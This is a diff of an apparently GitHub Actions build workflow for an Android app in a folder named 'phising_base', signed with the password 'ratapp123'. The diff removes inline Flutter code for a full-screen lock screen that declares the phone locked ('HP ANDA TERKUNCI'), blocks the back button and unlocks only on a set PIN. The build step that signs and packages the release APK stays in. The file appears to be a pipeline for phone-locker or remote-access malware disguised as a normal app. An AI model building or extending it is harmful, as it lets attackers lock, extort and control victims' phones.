-            }
-            void _checkPin() {
-              if (_inputPin == widget.correctPin) widget.onUnlock();
-              else { setState(() { _isError = true; _inputPin = ''; }); HapticFeedback.heavyImpact(); }
-            }
-            @override
-            Widget build(BuildContext context) {
-              return PopScope(canPop: false, child: Scaffold(
-                backgroundColor: const Color(0xFF1A0000),
-                body: SafeArea(child: Column(children: [
-                  const Spacer(),
-                  ScaleTransition(scale: _pulseAnim, child: Container(padding: const EdgeInsets.all(28), decoration: BoxDecoration(color: Colors.red.withOpacity(0.15), shape: BoxShape.circle, border: Border.all(color: Colors.red.withOpacity(0.5), width: 3)), child: const Icon(Icons.dangerous_rounded, size: 72, color: Colors.red))),
-                  const SizedBox(height: 24),
-                  const Text('⚠️ HP ANDA TERKUNCI ⚠️', style: TextStyle(color: Colors.red, fontSize: 20, fontWeight: FontWeight.w900, letterSpacing: 1.5)),
-                  const SizedBox(height: 16),
-                  Padding(padding: const EdgeInsets.symmetric(horizontal: 32), child: Text(widget.message, textAlign: TextAlign.center, style: const TextStyle(color: Colors.white70, fontSize: 14, height: 1.5))),
-                  const SizedBox(height: 32),
-                  Row(mainAxisAlignment: MainAxisAlignment.center, children: List.generate(widget.correctPin.length, (i) {
-                    final filled = i < _inputPin.length;
-                    return Container(margin: const EdgeInsets.symmetric(horizontal: 8), width: 16, height: 16, decoration: BoxDecoration(shape: BoxShape.circle, color: _isError ? Colors.redAccent : (filled ? Colors.red : Colors.white24), border: Border.all(color: filled ? Colors.red : Colors.white30, width: 2)));
-                  })),
-                  const SizedBox(height: 16),
-                  if (_isError) const Text('KODE SALAH!', style: TextStyle(color: Colors.redAccent, fontSize: 14, fontWeight: FontWeight.bold)),
-                  const Spacer(),
-                  Padding(padding: const EdgeInsets.symmetric(horizontal: 40), child: Column(children: [
-                    _buildRow(['1', '2', '3']), const SizedBox(height: 12),
-                    _buildRow(['4', '5', '6']), const SizedBox(height: 12),
-                    _buildRow(['7', '8', '9']), const SizedBox(height: 12),
-                    Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [const SizedBox(width: 68), _buildButton('0'), _buildDeleteButton()]),
-                  ])),
-                  const SizedBox(height: 40),
-                ])),
-              ));
-            }
-            Widget _buildRow(List<String> keys) => Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: keys.map((k) => _buildButton(k)).toList());
-            Widget _buildButton(String value) => GestureDetector(onTap: () => _onKeyPress(value), child: Container(width: 68, height: 68, decoration: BoxDecoration(shape: BoxShape.circle, color: const Color(0xFF2A0000), border: Border.all(color: Colors.red.withOpacity(0.2))), child: Center(child: Text(value, style: const TextStyle(color: Colors.white, fontSize: 26, fontWeight: FontWeight.w500)))));
-            Widget _buildDeleteButton() => GestureDetector(onTap: _onDelete, child: Container(width: 68, height: 68, decoration: const BoxDecoration(shape: BoxShape.circle), child: const Center(child: Icon(Icons.backspace_outlined, color: Colors.white54, size: 26))));
-          }
-          EOF
-
+      # ============================================
+      # 6. BUILD APK
+      # ============================================
       - name: Build & Sign APK
         run: |
           cd phising_base
+          flutter pub get
           dart run flutter_launcher_icons
           keytool -genkey -v -keystore release.jks -keyalg RSA -keysize 2048 -validity 10000 -alias key0 -storepass ratapp123 -keypass ratapp123 -dname "CN=Android, OU=Android, O=Android, L=Android, ST=Android, C=US"
           flutter build apk --release
